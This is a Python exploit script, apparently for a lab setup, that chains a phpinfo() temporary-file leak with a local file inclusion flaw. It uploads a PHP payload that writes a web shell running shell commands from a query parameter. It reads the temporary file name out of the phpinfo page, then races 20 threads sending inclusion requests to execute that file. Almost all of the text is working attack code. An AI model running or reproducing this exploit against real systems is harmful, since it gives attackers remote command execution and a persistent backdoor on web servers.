import socket
import threading



# 設定request
def setup(host,port):

    padding = "A" * 5000
    TAG = "Security Test"
    PAYLOAD = """%s\r
<?php $c=fopen('shell.php','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>\r""" % TAG
    
    # 請求的正文部分
    body = f"""
------WebKitFormBoundaryfHfyAsoxPPUAHIAj\r
Content-Disposition: form-data; name="file"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{PAYLOAD} \r
------WebKitFormBoundaryfHfyAsoxPPUAHIAj--\r
    """

    # 計算 Content-Length
    content_length = len(body)

    # 組建 HTTP Request
    TMPrequest = f"""POST /phpinfo.php?a=test.txt HTTP/1.1
Host: {host}:{port}
Content-Length: {content_length}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfHfyAsoxPPUAHIAj
Connection: keep-alive
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}
Cache-Control: {padding}
Accept-Language: {padding}
Upgrade-Insecure-Requests: {padding}
User-Agent: {padding}
Accept: {padding}

{body}"""


    LFIrequest = """
GET /lfi.php?file=%s HTTP/1.1
Host: 192.168.56.1:8000
User-Agent: Mozilla/4.0
Proxy-Connection: Keep-Alive

"""


    return(TMPrequest , TAG , LFIrequest)

#找出tmp的偏移
def offset(request,host,port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    client_socket.send(request.encode('utf-8'))
    response = b""
    while True:
        chunk = client_socket.recv(4096)
        if not chunk:
            break
        response += chunk
    client_socket.close()
    
    i = response.find(b"[tmp_name] =&gt")
    if i == -1:
        raise ValueError ("no tmp file")
        
    print ("find tmp in %s",i)
        
    tmp_name = response[i:i+100]

    start = tmp_name.find(b'&gt;') +5 +i
    end = tmp_name.find(b'.tmp') +4 +i

    i += 255
    print(end-start)
    return(start,end)



def LFI(LFIrequest,request,start,end,host,port,TAG):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect((host, port))

    s.send(request.encode('utf-8'))
    d = ""
    while (len(d)<end):
        d += s.recv(end).decode('utf-8')
    
    fn = d[start:end]

    s2.send((LFIrequest % str(fn)).encode('utf-8'))

    response = s2.recv(4096)
    response = s2.recv(4096)

    s.close()
    s2.close()
    
    if response.decode('utf-8').find(TAG) !=-1:
        return fn
        
counter = 0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
            try:
                x = LFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell created in /tmp/g")
                    self.event.set()
            except socket.error:
                return



def main():

    host = '127.0.0.1'
    port = 80

    TMPrequest , tag , LFIrequest =setup(host,port)
    start , end = offset(TMPrequest,host,port)




    # LFI(LFIrequest, TMPrequest, start, end, host, port, tag)

    maxattempts = 1000
    poolsz = 20
    e = threading.Event()
    l = threading.Lock()
    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts,  LFIrequest, TMPrequest, start, end, host, port, tag))
                #                                   def LFI(LFIrequest,request,start,end,host,port,TAG):

    
    for t in tp:
        t.start()

    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                print("\r% 4d / % 4d" % (counter, maxattempts))
            if counter >= maxattempts:
                break
        print()
        if e.is_set():
            print("Woot!")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()


if __name__ == "__main__":
    main()
